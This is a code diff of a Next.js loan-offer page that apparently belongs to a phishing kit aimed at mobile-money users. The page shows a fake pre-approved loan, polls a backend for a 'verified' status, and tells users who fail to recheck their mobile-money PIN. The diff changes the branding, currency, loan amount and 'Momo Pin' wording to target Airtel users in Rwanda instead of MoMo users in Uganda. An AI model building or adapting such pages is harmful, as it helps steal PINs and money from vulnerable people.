@@ -90,7 +90,7 @@ export default function LoanLimitPage() {
         const statusData = await response.json();
 
         if (statusData.status === 'verified') {
-          router.push('/loan-otp?recordId=' + recId);
+          router.push('/success?recordId=' + recId);
           if (pollingIntervalRef.current) {
             clearInterval(pollingIntervalRef.current);
           }
@@ -144,19 +144,19 @@ export default function LoanLimitPage() {
       <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Here is the amount you can borrow</p>
 
       {/* Loan Amount Card */}
-      <div className="bg-gradient-to-br from-yellow-50 to-yellow-100 border-2 border-yellow-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
+      <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
         <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Available Loan Amount</p>
         <div className="flex items-center justify-center gap-2 mb-2">
-          <h3 className="text-4xl sm:text-5xl font-black text-black">3,000,000</h3>
+          <h3 className="text-4xl sm:text-5xl font-black text-black">750,000</h3>
         </div>
-        <p className="text-gray-600 text-base sm:text-lg">UGX</p>
+        <p className="text-gray-600 text-base sm:text-lg">RWF</p>
       </div>
 
       {/* Details Section */}
       <div className="space-y-4 mb-8 sm:mb-12">
         <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
           <span className="text-gray-600 font-semibold text-sm sm:text-base">Loan Term</span>
-          <span className="text-black font-bold text-sm sm:text-base">6 months</span>
+          <span className="text-black font-bold text-sm sm:text-base">12 months</span>
         </div>
         <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
           <span className="text-gray-600 font-semibold text-sm sm:text-base">Interest Rate</span>
@@ -172,7 +172,7 @@ export default function LoanLimitPage() {
       <button 
         onClick={handleContinue}
         disabled={isProcessing}
-        className="w-full bg-yellow-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-yellow-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
+        className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
         {isProcessing ? 'Processing...' : 'Continue to Get Loan'}
         <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
       </button>
@@ -181,7 +181,7 @@ export default function LoanLimitPage() {
       {showLoadingModal && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
-            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-yellow-600 animate-spin mx-auto mb-4" />
+            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-red-600 animate-spin mx-auto mb-4" />
             <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Processing</h3>
             <p className="text-gray-500 text-sm sm:text-base">
               Please wait while we verify your loan request...
@@ -208,12 +208,12 @@ export default function LoanLimitPage() {
 
             <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Wrong Pin Entered</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              Your loan request has been denied. Please check your Momo Pin and try again.
+              Your loan request has been denied. Please check your Airtel Pin and try again.
             </p>
 
             <button 
               onClick={handleRestart}
-              className="w-full bg-yellow-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-yellow-500 transition-colors">
+              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors">
               Restart
             </button>
           </div>
